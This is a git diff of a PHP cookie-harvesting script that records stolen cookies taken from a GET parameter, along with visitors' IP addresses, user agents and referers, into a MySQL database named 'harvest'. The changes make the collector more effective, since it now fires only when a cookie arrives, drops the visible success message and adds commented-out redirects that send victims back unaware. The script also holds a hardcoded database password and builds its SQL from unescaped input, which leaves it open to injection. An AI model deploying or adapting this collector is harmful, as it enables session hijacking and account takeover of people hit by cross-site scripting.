@@ -1,5 +1,4 @@
 <?php 
-
 function GetIP() 
 { 
 	if (getenv("HTTP_CLIENT_IP") && strcasecmp(getenv("HTTP_CLIENT_IP"), "unknown")) 
@@ -17,7 +16,8 @@ function GetIP()
 
 function logData() 
 { 
-	$data["cookie"] = $_SERVER['QUERY_STRING']; 
+	$data['cookie'] = $_GET['cookie'];
+	$data["query"] = $_SERVER['QUERY_STRING']; 
 	$register_globals = (bool) ini_get('register_gobals'); 
 	if ($register_globals) $data["ip"] = getenv('REMOTE_ADDR'); 
 	else $data["ip"] = GetIP(); 
@@ -32,23 +32,23 @@ function logData()
 	return $data;
 
 } 
-
+if(isset($_GET['cookie'])){
 $data = logData();
 	
 $servername = "localhost";
-$username = "revelation";
+$username = "root";
 $password = "r3v3l@t104";
 $dbname = "harvest";
-$sql = 'INSERT INTO cookies (cookie, ip, rem_port, user_agent, rqst_method, rem_host, referer, date)
-    VALUES ('.$data["cookie"].', '.$data["ip"].', '.$data["rem_port"].', '.$data["user_agent"].', '.$data["rqst_method"].','.$data["rem_host"].', '.$data["referer"].', '.$data["date"].')';
-    
+$sql = 'INSERT INTO cookie (cookie, query, ip, rem_port, user_agent, rqst_method, rem_host, referer, date)
+    VALUES ("'.$data["cookie"].'", "'.$data["query"].'", "'.$data["ip"].'", "'.$data["rem_port"].'", "'.$data["user_agent"].'", "'.$data["rqst_method"].'","'.$data["rem_host"].'", "'.$data["referer"].'", "'.$data["date"].'")';
+
 try {
     $conn = new PDO("mysql:host=$servername;dbname=$dbname", $username, $password);
     // set the PDO error mode to exception
     $conn->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);
     // use exec() because no results are returned
     $conn->exec($sql);
-    echo "New record created successfully";
+    //echo "New record created successfully";
     }
 catch(PDOException $e)
     {
@@ -56,6 +56,7 @@ catch(PDOException $e)
     }
 
 $conn = null;
-	
-
+//header("Location: " . $_SERVER["HTTP_REFERER"]);
+//header("location:javascript://history.go(-1)");
+}
 ?>
